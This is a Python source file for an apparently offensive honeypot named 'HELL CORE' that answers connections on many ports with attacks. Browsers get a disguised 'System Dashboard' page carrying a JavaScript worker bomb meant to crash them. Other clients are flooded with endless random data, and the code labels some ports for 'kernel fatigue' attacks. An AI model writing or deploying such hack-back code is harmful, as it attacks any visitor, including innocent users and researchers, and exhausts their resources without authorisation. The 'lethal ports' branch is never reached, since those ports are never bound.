import socket
import threading
import time
import random
import os
import gzip
import io
import urllib.parse
from ai_module import GeminiDefender
from threat_intel import VirusTotalReporter

# CONFIGURACIÓN HELL v1.6.2: LOGGING & WEB FIX
HOST = '0.0.0.0'
LETHAL_PORTS = [2222, 3389, 4455]
PORTS = [8080, 2525, 3306, 6379, 1337, 8081, 8082, 2375, 8090, 8125, 8443]
GZIP_BOMB_PATH = "payloads/bomb.gz"
LOG_FILE = "logs/hell_activity.log"

USE_AI = os.getenv("USE_AI", "false").lower() == "true"
GEMINI_KEY = os.getenv("GEMINI_API_KEY", "")
VT_KEY = os.getenv("VT_API_KEY", "")
MY_IP = os.getenv("MY_IP", "127.0.0.1")

class HellServer:
    def __init__(self):
        # Asegurar que las carpetas existen antes de iniciar
        os.makedirs("logs", exist_ok=True)
        os.makedirs("payloads", exist_ok=True)
        
        self.defender = GeminiDefender(GEMINI_KEY) if USE_AI else None
        self.reporter = VirusTotalReporter(VT_KEY)
        self.whitelist = {MY_IP, "127.0.0.1"}
        print(f"[💀] HELL CORE v1.6.2: SISTEMA OPERATIVO Y LOGS CORREGIDOS")

    def log_event(self, message):
        """Escribe eventos en el log y asegura el guardado inmediato"""
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] {message}\n"
        try:
            with open(LOG_FILE, "a", encoding='utf-8') as f:
                f.write(log_entry)
                f.flush() # Forzar escritura en disco
            print(log_entry.strip())
        except Exception as e:
            print(f"Error escribiendo log: {e}")

    def handle_telemetry(self, client_socket, addr, request):
        self.log_event(f"[🕵️] CERBERUS BEACON: Señal de {addr[0]}")
        client_socket.send(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")

    def handle_client(self, client_socket, addr, local_port):
        if addr[0] in self.whitelist:
            self.log_event(f"[👑] Whitelist Access: {addr[0]}")
            client_socket.close(); return

        try:
            request = client_socket.recv(4096).decode('utf-8', errors='ignore')
            self.log_event(f"[*] Hit en puerto {local_port} desde {addr[0]}")
            
            if "/api/v1/telemetry/" in request:
                self.handle_telemetry(client_socket, addr, request)
                return

            # PUERTO 8080: DESPACHADOR WEB Y JS BOMB
            if local_port == 8080:
                if "User-Agent" in request and ("Mozilla" in request or "Chrome" in request):
                    self.log_event(f"[🧨] Despachando JS BOMB a navegador en {addr[0]}")
                    content = "<html><head><title>System Dashboard</title></head><body><h1>Loading Critical Data...</h1><script>while(true){new Worker(URL.createObjectURL(new Blob(['while(true){}'])));}</script></body></html>"
                    header = f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(content)}\r\n\r\n"
                    client_socket.send(header.encode() + content.encode())
                else:
                    self.log_event(f"[🌊] Inundando script/bot en {addr[0]}")
                    while True: client_socket.send(os.urandom(4096)); time.sleep(0.1)

            elif local_port == 1337: # Switch UI
                with open("assets/trap_1337.html", "r") as f:
                    content = f.read()
                    header = f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(content)}\r\n\r\n"
                    client_socket.send(header.encode() + content.encode())
            
            elif local_port in LETHAL_PORTS:
                self.log_event(f"[⚡] Fatiga de Kernel iniciada contra {addr[0]}")
                while True: client_socket.send(os.urandom(1)); time.sleep(0.001)
            
            else:
                while True: client_socket.send(os.urandom(4096)); time.sleep(0.1)

        except: pass
        finally: client_socket.close()

    def start_listener(self, port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((HOST, port))
        server.listen(100)
        while True:
            try:
                client, addr = server.accept()
                threading.Thread(target=self.handle_client, args=(client, addr, port)).start()
            except: pass

    def start(self):
        self.log_event(f"[✔] HELL CORE v1.6.2 activo en {len(PORTS)} puertos.")
        for port in PORTS:
            threading.Thread(target=self.start_listener, args=(port,), daemon=True).start()
        while True: time.sleep(1)

if __name__ == "__main__":
    HellServer().start()
